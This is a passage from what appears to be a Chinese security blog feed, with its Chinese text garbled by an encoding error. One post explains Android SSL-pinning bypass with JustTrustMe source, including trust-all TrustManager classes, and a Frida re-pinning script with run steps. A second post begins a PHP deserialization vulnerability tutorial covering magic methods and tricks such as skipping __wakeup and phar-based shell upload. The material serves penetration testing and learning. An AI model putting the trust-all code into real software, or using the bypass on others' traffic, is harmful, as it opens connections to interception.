Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 3.x not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking OkHostnameVerifier.verify(String, X509)(&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ImSureItsLegitTrustManager</span> <span class="keyword">implements</span> <span class="title class_">X509TrustManager</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123; &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123; &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">X509Certificate</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This class creates a SSLSocket that trusts everyone. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrustAllSSLSocketFactory</span> <span class="keyword">extends</span> <span class="title class_">SSLSocketFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">TrustAllSSLSocketFactory</span><span class="params">(KeyStore truststore)</span> <span class="keyword">throws</span></span><br><span class="line">                      NoSuchAlgorithmException, KeyManagementException, KeyStoreException, UnrecoverableKeyException &#123;</span><br><span class="line">            <span class="built_in">super</span>(truststore);</span><br><span class="line"></span><br><span class="line">            <span class="type">TrustManager</span> <span class="variable">tm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">X509TrustManager</span>() &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            sslContext.init(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">TrustManager</span>[] &#123; tm &#125;, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Socket <span class="title function_">createSocket</span><span class="params">(Socket socket, String host, <span class="type">int</span> port, <span class="type">boolean</span> autoClose)</span> <span class="keyword">throws</span> IOException, UnknownHostException &#123;</span><br><span class="line">            <span class="keyword">return</span> sslContext.getSocketFactory().createSocket(socket, host, port, autoClose);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Socket <span class="title function_">createSocket</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> sslContext.getSocketFactory().createSocket();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// findAndHookMethod å°±æ˜¯hookå¯¹åº”æ–¹æ³• å®ƒhookçš„å‡½æ•°å°±æ˜¯ è¯ä¹¦æ ¡éªŒç”¨åˆ°çš„å‡½æ•°</span></span><br></pre></td></tr></table></figure>
<p style="text-indent: 2em;">é€šè¿‡ä¸Šè¿°ä»£ç æˆ‘ä»¬å‘ç°JustTrustMeå‡ ä¹hookä½äº†æ‰€æœ‰æœ‰å…³è¯ä¹¦éªŒè¯çš„æ“ä½œé€šè¿‡ä¿®æ”¹è¿”å›å€¼ã€å¿½ç•¥è¯ä¹¦é”™è¯¯ç­‰æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡ã€‚
<p style="text-indent: 2em;">ä½†æ˜¯JustTrustMeæ²¡æœ‰hook   public OkHttpClient.Builder hostnameVerifierï¼ˆOkhttp ä¸­å¦‚æœä¸æŒ‡å®š HostnameVerifier é»˜è®¤è°ƒç”¨çš„æ˜¯ OkHostnameVerifier.verify è¿›è¡ŒæœåŠ¡å™¨ä¸»æœºåæ ¡éªŒï¼›å¦‚æœè®¾ç½®äº† HostnameVerifierï¼Œåˆ™é»˜è®¤è°ƒç”¨çš„æ˜¯è‡ªå®šä¹‰çš„ verify æ–¹æ³•ï¼Œè€ŒOkHttpClient.Builderæ˜¯ç”¨æ¥å¯¹OkHttpClientè¿›è¡Œè®¾ç½®çš„ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œå°±å¾ˆå¯èƒ½å‡ºé—®é¢˜ã€‚è‡³äºå…¶ä»–çš„æ¼æ‰çš„hookç›®å‰è¿˜æœªæµ‹å‡ºã€‚ä¹Ÿæœ‰å¯èƒ½æ˜¯ä»–æ˜¯githubæ˜Ÿæ˜Ÿæœ€å¤šçš„é¡¹ç›®ï¼Œå¤§å®¶éƒ½å¯¹å®ƒè¿›è¡Œä¸‹æ‰‹äº†ï¼ŒğŸ˜‚ã€‚æ€»ä¹‹JustTrustMeæœ‰æ—¶å€™ä¼šä¸èµ·ä½œç”¨ã€‚æ‰€ä»¥æˆ‘å¹³æ—¶ä¹Ÿä¸æ˜¯ç»å¸¸ç”¨å®ƒã€‚

<p><strong>ssl-unpiningæ¨¡å—ç»•è¿‡</strong></p>
<p style="text-indent: 2em;">æ­¤æ¨¡å—æ˜¯æˆ‘ç”¨çš„æœ€å¤šçš„ï¼Œä»–æ¯”JustTrustMe æ›´ç¨³å®šã€hookçš„æ›´å…¨é¢ï¼Œä¸€èˆ¬å¯ä»¥ç›´æ¥hookæŠ“åŒ…ï¼Œè€Œä¸”ç”±äºå®ƒåŒæ ·ä¸éœ€è¦æˆ‘ä»¬ç¼–å†™ä»£ç ï¼Œæ˜¯æœ€æ–¹ä¾¿æ–°æ‰‹çš„äº†ã€‚</p>
<p style="text-indent: 2em;">æ¨¡å—ä¸‹è½½åœ°å€ï¼šhttps://github.com/ac-pm/SSLUnpinning_Xposed

<p style="text-indent: 2em;">ç›´æ¥å®‰è£…åé‡å¯é…ç½®ä»£ç†æŠ“åŒ…å³å¯ï¼Œç®€å•ç²—æš´ã€‚</p>

<p><strong>fridaç»•è¿‡SSLPinning</strong></p>
<p style="text-indent: 2em;">fridaç¡®å®æ˜¯å¾ˆå¥½ç”¨çš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒä¸éœ€è¦åƒxposeé‚£æ ·é¢‘ç¹é‡å¯ï¼Œè€Œä¸”è¿˜å¯ä»¥å®šåˆ¶åŒ–hookè‡ªå·±æƒ³ä¿®æ”¹çš„å‡½æ•°ã€‚æˆ‘å¹³å¸¸ç”¨fridaæ˜¯é€šè¿‡jsä»£ç æ¥è¿›è¡Œhookçš„

<p style="text-indent: 2em;">ä¸‹é¢å°±æ˜¯æˆ‘å¸¸ç”¨çš„ä¸€ä¸ªssl-Unpinningçš„è„šæœ¬(å…¶å®å°±æ˜¯é€šè¿‡äººå®¶å¼€æºçš„ä¿®æ”¹è€Œæ¥)ï¼š

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Android SSL Re-pinning frida script v0.2 030417-pier</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">   $ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt</span></span><br><span class="line"><span class="comment">   $ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">   https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[.] Cert Pinning Bypass/Re-Pinning&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CertificateFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.cert.CertificateFactory&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">FileInputStream</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileInputStream&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BufferedInputStream</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.BufferedInputStream&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> X509Certificate = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">TrustManagerFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.TrustManagerFactory&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">SSLContext</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.SSLContext&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Load CAs from an InputStream</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Loading our CA...&quot;</span>)</span><br><span class="line">        cf = <span class="title class_">CertificateFactory</span>.<span class="title function_">getInstance</span>(<span class="string">&quot;X.509&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> fileInputStream = <span class="title class_">FileInputStream</span>.$new(<span class="string">&quot;/data/local/tmp/1111.crt&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[o] &quot;</span> + err);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">var</span> bufferedInputStream = <span class="title class_">BufferedInputStream</span>.$new(fileInputStream);</span><br><span class="line">          <span class="keyword">var</span> ca = cf.<span class="title function_">generateCertificate</span>(bufferedInputStream);</span><br><span class="line">        bufferedInputStream.<span class="title function_">close</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">var</span> certInfo = <span class="title class_">Java</span>.<span class="title function_">cast</span>(ca, X509Certificate);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[o] Our CA Info: &quot;</span> + certInfo.<span class="title function_">getSubjectDN</span>());</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Create a KeyStore containing our trusted CAs</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Creating a KeyStore for our CA...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> keyStoreType = <span class="title class_">KeyStore</span>.<span class="title function_">getDefaultType</span>();</span><br><span class="line">        <span class="keyword">var</span> keyStore = <span class="title class_">KeyStore</span>.<span class="title function_">getInstance</span>(keyStoreType);</span><br><span class="line">        keyStore.<span class="title function_">load</span>(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        keyStore.<span class="title function_">setCertificateEntry</span>(<span class="string">&quot;ca&quot;</span>, ca);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Create a TrustManager that trusts the CAs in our KeyStore</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Creating a TrustManager that trusts the CA in our KeyStore...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> tmfAlgorithm = <span class="title class_">TrustManagerFactory</span>.<span class="title function_">getDefaultAlgorithm</span>();</span><br><span class="line">        <span class="keyword">var</span> tmf = <span class="title class_">TrustManagerFactory</span>.<span class="title function_">getInstance</span>(tmfAlgorithm);</span><br><span class="line">        tmf.<span class="title function_">init</span>(keyStore);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Our TrustManager is ready...&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hijacking SSLContext methods now...&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[-] Waiting for the app to invoke SSLContext.init()...&quot;</span>)</span><br><span class="line"> </span><br><span class="line">           <span class="title class_">SSLContext</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="string">&quot;java.security.SecureRandom&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b,c</span>) &#123;</span><br><span class="line">               <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[o] App invoked javax.net.ssl.SSLContext.init...&quot;</span>);</span><br><span class="line">               <span class="title class_">SSLContext</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="string">&quot;java.security.SecureRandom&quot;</span>).<span class="title function_">call</span>(<span class="variable language_">this</span>, a, tmf.<span class="title function_">getTrustManagers</span>(), c);</span><br><span class="line">               <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] SSLContext initialized with our custom TrustManager!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ­¥éª¤ï¼š</p>
<p>1ã€å¯¼å‡ºburpè¯ä¹¦æ”¾å…¥æ‰‹æœºçš„&#x2F;data&#x2F;local&#x2F;tmpå†…ï¼Œè¯ä¹¦æ ¼å¼ä¸ºcrt(å¯ç›´æ¥burpè¯ä¹¦ä¿®æ”¹åç¼€å)ï¼Œæœ€å¥½ä¹Ÿåœ¨æ‰‹æœºä¸Šå®‰è£…ä¸‹è¿™ä¸ªè¯ä¹¦æ–¹ä¾¿ä»¥åæŠ“åŒ…çš„æ“ä½œ</p>
<p>2ã€adb shell è¿›å…¥æ‰‹æœºå‘½ä»¤è¡Œ å¼€å¯ frida server</p>
<p>3ã€ä¿®æ”¹frida-android-repining_sa1.jsä»£ç ä¸­28è¡Œçš„è¯ä¹¦è·¯å¾„</p>
<p>4ã€frida -U -f åŒ…å -l .\frida-android-repining_sa1.js â€“no-pause</p>
<h3 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p style="text-indent: 2em;">ä¸Šè¿°è¿™äº›éƒ½æ˜¯æˆ‘ç»•è¿‡SSL-Pinningçš„ä¸€äº›ç»éªŒ,å¦‚æœæœ‰é”™è¯¯çš„åœ°æ–¹è¿˜å¸Œæœ›å¤§å®¶å¯çŸ¥æŒ‡å‡ºæ¥,å¸®åŠ©æˆ‘æ›´å¥½çš„å­¦ä¹ andriodå®‰å…¨.ç„¶åæƒ³è¯´æœ€è¿‘è®¿é—®ç‚¹æ¶¨çš„æœ‰ç‚¹çŒ›,ä¸çŸ¥é“æ˜¯çœŸçš„æœ‰äººåœ¨çœ‹å—?è¿˜æ˜¯æœ‰äººæ‰«æ?æˆ‘å¾ˆæ…Œ!!!



]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>app</tag>
        <tag>ssl-unpining</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…è°ˆphpååºåˆ—åŒ–</title>
    <url>//posts/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><hr>
<p>phpæ˜¯è¿™ä¸ªè¯­è¨€æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€( æ»‘ç¨½ )ã€‚phpçš„ååºåˆ—åŒ–ä¹Ÿå¯ä»¥è¯´æ˜¯æ¼æ´ä¼—å¤šäº†ï¼Œå› ä¸ºå®ƒçš„ä½¿ç”¨ï¼Œçˆ†å‡ºäº†å¾ˆå¤šçŸ¥åcmsçš„é€šæ€æ¼æ´ã€‚è€Œä¸”å› ä¸ºç”¨çš„äººå¤šï¼Œæ‰€ä»¥åœ¨å…¶ä»–å°ä¼—cmsä¸­è¿˜æœ‰å¾ˆå¤šæœªè¢«å‘ç°çš„ååºåˆ—åŒ–æ¼æ´ï¼Œå¦å¤–CTFä¸­phpçš„ååºåˆ—åŒ–ä¹Ÿæ˜¯å¸¸è€ƒç‚¹ï¼Œæ‰€ä»¥è¿™ç¯‡æ¥ç®€å•è®²ä¸€ä¸‹phpçš„ååºåˆ—åŒ–æ¼æ´ã€‚å½“ç„¶javaçš„ååºåˆ—åŒ–é—®é¢˜ä¹Ÿä¸å°‘ï¼Œä»¥åæœ‰æ—¶é—´ä¼šå†™javaçš„ã€‚  </p>
<h4 id="phpååºåˆ—åŒ–æ¼æ´çš„æ ¸å¿ƒ"><a href="#phpååºåˆ—åŒ–æ¼æ´çš„æ ¸å¿ƒ" class="headerlink" title="phpååºåˆ—åŒ–æ¼æ´çš„æ ¸å¿ƒ"></a>phpååºåˆ—åŒ–æ¼æ´çš„æ ¸å¿ƒ</h4><hr>
<p>å…¶å®phpååºåˆ—åŒ–çš„æ ¸å¿ƒåœ¨äºä¸¤ç‚¹ï¼š  </p>
<ul>
<li>ç”¨æˆ·å¯æ§çš„ååºåˆ—åŒ–è¾“å…¥ç‚¹  </li>
<li>å¯åˆ©ç”¨çš„å±é™©å‡½æ•°  <span id="more"></span></li>
</ul>
<p>å¯æ§è¾“å…¥ç‚¹æ„é€ åˆ©ç”¨å¯åˆ©ç”¨çš„å±é™©å‡½æ•°ï¼Œå¬èµ·æ¥å¾ˆç®€å•ï¼Œä½†æ˜¯ç”¨çš„æ—¶å€™åˆæ˜¯å¦ä¸€å›äº‹ã€‚<br>æ¯”å¦‚å•†ç”¨cmsï¼Œæ€»æ˜¯æ¨¡å—åŒ–å¼€å‘ï¼Œå¯æ§ç‚¹å¯èƒ½å…¨å±€æœç´¢ä¸‹å°±çŸ¥é“äº†ï¼Œä½†æ˜¯å¯åˆ©ç”¨å‡½æ•°è¦ä¸æ²¡æœ‰ã€è¦ä¸å°±éœ€è¦ç¿»æ‰¾å¯æ§ç‚¹è°ƒç”¨çš„å…¶ä»–çš„ç±»ï¼Œè€Œå…¶ä»–ç±»åˆè°ƒç”¨äº†å…¶ä»–ç±»ï¼Œè¿™åƒä¸ªé€’å½’ï¼ˆå“ˆå“ˆï¼‰ã€‚æ‰€ä»¥å¿…é¡»å¾ˆç†Ÿæ‚‰æŸå¥—cmsæ‰å¯èƒ½æŒ–åˆ°æŸä¸ªcmsçš„æ¼æ´ã€‚<br>è€Œctfæ¯”èµ›ä¸­ï¼Œä¸€èˆ¬æ˜¯èƒ½è®©ä½ ä¸€çœ¼å°±çœ‹å‡ºååºåˆ—åŒ–çš„å¯æ§ç‚¹å’Œå±é™©åˆ©ç”¨çš„å‡½æ•°ã€‚ä½†æ˜¯æ€»æ˜¯éœ€è¦ç»•è¿‡ä¸€äº›ä¸œè¥¿ï¼Œæ¯”å¦‚wakeupä¸­çš„wafã€parse_urlçš„ç»•è¿‡ã€å˜é‡è¦†ç›–ã€ç»“åˆssrfç­‰å…¶ä»–çš„çŸ¥è¯†ç‚¹ã€‚<br>æ‰€ä»¥phpååºåˆ—åŒ–æ˜¯ä¸€ä¸ªåŸç†éå¸¸ç®€å•ã€ä½†æ˜¯ç©å„¿èµ·æ¥è¿˜æ˜¯ç•¥å¾®æœ‰ç‚¹å›°éš¾çš„ä¸œè¥¿ã€‚  </p>
<h4 id="phpååºåˆ—åŒ–çš„åŸºç¡€çŸ¥è¯†"><a href="#phpååºåˆ—åŒ–çš„åŸºç¡€çŸ¥è¯†" class="headerlink" title="phpååºåˆ—åŒ–çš„åŸºç¡€çŸ¥è¯†"></a>phpååºåˆ—åŒ–çš„åŸºç¡€çŸ¥è¯†</h4><hr>
<p>åœ¨PHPä¸­ï¼Œåºåˆ—åŒ–ç”¨äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚è¿™æ˜¯phpååºåˆ—åŒ–çš„ç”¨å¤„ã€‚å¾ˆå¤šéœ€è¦å­˜å‚¨å’Œä¼ è¾“çš„ä¸œè¥¿å¦‚æœä¸æ–¹ä¾¿ä¼ è¾“ï¼ˆæ¯”å¦‚å¯¹è±¡ï¼‰æˆ‘ä»¬å°±ä¼šè¿›è¡Œåºåˆ—åŒ–åæ“ä½œã€‚æ‰€ä»¥æˆ‘ä»¬å¯»æ‰¾ååºåˆ—åŒ–å°±è¦ç«™åœ¨å¼€å‘çš„è§’åº¦æ€è€ƒä»€ä¹ˆæ—¶å€™ç”¨åˆ°åºåˆ—åŒ–ï¼Ÿå¦å¤–æˆ‘ä»¬æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­çœ‹åˆ°åºåˆ—åŒ–å®Œçš„å‚æ•°åœ¨æˆ‘ä»¬æŠ“å–çš„åŒ…ä¸­ä¼ é€’ï¼Œé‚£ä¹ˆä¹Ÿåº”è¯¥è­¦è§‰ååºåˆ—åŒ–æ¼æ´ã€‚<br>å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$dog_name</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog_move</span>(<span class="params"><span class="variable">$dog_action</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$dog_action</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dog</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;dog_name=<span class="string">&quot;jim&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">dog_move</span>(<span class="string">&quot;wang ~&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>ç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;dog&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;dog_name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;jim&quot;</span>;&#125; <span class="comment">//è¿™å°±æ˜¯ä¸Šé¢çš„dogçš„ä¸€ä¸ªå®ä¾‹åºåˆ—åŒ–çš„å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure>
<p>å„ä¸ªç¼©å†™çš„å«ä¹‰</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">a -<span class="built_in"> array </span> </span><br><span class="line">b - boolean  </span><br><span class="line">d -<span class="built_in"> double </span> </span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
<p>å¥½äº†ååºåˆ—åŒ–å½¢æˆçš„å­—ç¬¦ä¸²çœ‹æ˜ç™½äº†ï¼Œä½†æ˜¯åºåˆ—åŒ–ååºåˆ—åŒ–è¿˜æœ‰ä¸€äº›é­”æœ¯æ–¹æ³•æˆ‘ä»¬ä¹Ÿéœ€è¦å­¦ä¹ ï¼š</p>
<ul>
<li>__wakeup()      å½“åºåˆ—åŒ–æ—¶è°ƒç”¨ serialize  </li>
<li>__construct():   å½“ä¸€ä¸ªç±»è¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨  </li>
<li>__destruct():     å½“ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨</li>
<li>__invoke():       å½“æŠŠä¸€ä¸ªç±»å½“ä½œå‡½æ•°ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨  </li>
<li>__tostring():      å½“æŠŠä¸€ä¸ªç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨  </li>
<li>__wakeup():     å½“è°ƒç”¨unserialize()å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨  </li>
<li>__sleep():         å½“è°ƒç”¨serialize()å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨  </li>
<li>__call():            å½“è¦è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æˆ–æƒé™ä¸è¶³æ—¶è‡ªåŠ¨è°ƒç”¨  </li>
<li>__get()             ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®  </li>
<li>__set()             ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§  </li>
<li>__isset()           åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘  </li>
<li>__unset()         åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</li>
</ul>
<p>ç„¶åæˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ç‚¹éªšæŠ€å·§ï¼š</p>
<ul>
<li>åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</li>
<li>ååºåˆ—åŒ–ç»“åˆphar fileç­‰ä¼ªåè®®è¿›è¡Œçš„æ–‡ä»¶è¯»å–å’Œä¸Šä¼ shellçš„æ“ä½œ</li>
<li>ååºåˆ—åŒ–å®Œçš„å­—ç¬¦ä¸²å„ç±»å‹å¯è§å­—ç¬¦ä¸²é•¿åº¦ä¸æ‰€æ˜¾ç¤ºç±»å‹é•¿åº¦ä¸åŒ¹é…æ—¶ï¼Œæ³¨æ„%00éæ‰“å°å­—ç¬¦çš„é—®é¢˜ éå¸¸å¸¸è§ï¼  </li>
<li>å¦‚æœåœ¨destruct()å‡½æ•°åœ¨ååºåˆ—åŒ–è§¦å‘æ—¶ï¼Œæœ‰æ–‡ä»¶å¼•å…¥ï¼Œååºåˆ—åŒ–æ—¶éœ€è¦ä½¿ç”¨æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œå› ä¸ºdestructåœ¨ååºåˆ—åŒ–è§¦å‘æ—¶çš„å·¥ä½œç›®å½•åœ¨phpæ ¹ç›®å½•ã€‚</li>
